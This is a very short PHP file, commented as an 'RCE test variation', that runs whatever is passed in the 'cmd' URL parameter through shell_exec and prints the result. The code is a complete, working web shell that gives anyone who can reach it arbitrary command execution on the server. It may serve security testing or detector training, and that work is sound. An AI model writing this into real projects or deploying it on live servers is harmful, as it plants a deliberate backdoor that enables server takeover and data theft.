<?php
// RCE test variation #1423
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>